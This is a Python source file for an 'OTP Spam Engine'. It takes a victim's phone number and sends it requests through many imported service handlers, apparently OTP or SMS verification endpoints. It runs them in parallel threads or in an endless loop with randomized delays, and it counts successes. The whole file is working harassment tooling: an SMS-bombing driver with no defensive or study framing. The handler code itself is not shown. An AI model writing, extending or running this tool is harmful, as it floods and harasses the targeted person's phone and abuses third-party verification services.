#!/usr/bin/env python3
# main_engine.py - OTP Spam Engine

import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style

from handlers import get_all_handlers
from firebase import AuthSystem

# ==================== SPAM ENGINE ====================
class SpamEngine:
    def __init__(self, phone, threads=5):
        self.phone = phone
        self.threads = threads
        self.handlers = get_all_handlers()
        self.results = {}
        self.success_count = 0
        self.fail_count = 0
        self.total_count = 0
    
    def run_single_round(self):
        print(f"\n{Fore.CYAN}[*] Starting Single Round with {len(self.handlers)} APIs...{Fore.RESET}\n")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(handler, self.phone): name for name, handler in self.handlers.items()}
            
            for i, future in enumerate(as_completed(futures), 1):
                name = futures[future]
                try:
                    result = future.result(timeout=15)
                    if result:
                        self.results[name] = 'SUCCESS'
                        self.success_count += 1
                    else:
                        self.results[name] = 'FAIL'
                        self.fail_count += 1
                except:
                    self.results[name] = 'ERROR'
                    self.fail_count += 1
                
                self.total_count += 1
                
                # Progress
                status = self.results[name]
                icon = f"{Fore.GREEN}✅{Fore.RESET}" if status == 'SUCCESS' else f"{Fore.RED}❌{Fore.RESET}" if status == 'FAIL' else f"{Fore.YELLOW}⚠️{Fore.RESET}"
                print(f"  {icon} {name:20} : {status}")
        
        print(f"\n{Fore.CYAN}📊 Result: {Fore.GREEN}Success: {self.success_count}{Fore.RESET} | {Fore.RED}Failed: {self.fail_count}{Fore.RESET}")
        return self.results
    
    def run_infinite(self):
        print(f"\n{Fore.RED}🔥 INFINITE MODE - Press Ctrl+C to stop{Fore.RESET}\n")
        
        counter = 0
        try:
            while True:
                counter += 1
                handler_name = random.choice(list(self.handlers.keys()))
                handler = self.handlers[handler_name]
                
                try:
                    result = handler(self.phone)
                    if result:
                        self.success_count += 1
                        icon = f"{Fore.GREEN}✅{Fore.RESET}"
                    else:
                        self.fail_count += 1
                        icon = f"{Fore.RED}❌{Fore.RESET}"
                except:
                    self.fail_count += 1
                    icon = f"{Fore.YELLOW}⚠️{Fore.RESET}"
                
                self.total_count += 1
                print(f"\r{icon} Round {counter} | Success: {self.success_count} | Failed: {self.fail_count} | Total: {self.total_count}", end='')
                time.sleep(random.uniform(0.5, 1.5))
        except KeyboardInterrupt:
            print(f"\n\n{Fore.CYAN}Stopped! Final stats:{Fore.RESET}")
            print(f"  {Fore.GREEN}Success: {self.success_count}{Fore.RESET}")
            print(f"  {Fore.RED}Failed: {self.fail_count}{Fore.RESET}")
            print(f"  {Fore.CYAN}Total: {self.total_count}{Fore.RESET}")

def run_single_round(phone, threads=5):
    engine = SpamEngine(phone, threads)
    return engine.run_single_round()

def run_infinite(phone):
    engine = SpamEngine(phone, threads=1)
    return engine.run_infinite()

def show_apis():
    handlers = get_all_handlers()
    print(f"\n{Fore.CYAN}📋 Available APIs ({len(handlers)} total):{Fore.RESET}")
    for i, (name, _) in enumerate(handlers.items(), 1):
        print(f"  {i:2}. {name}")
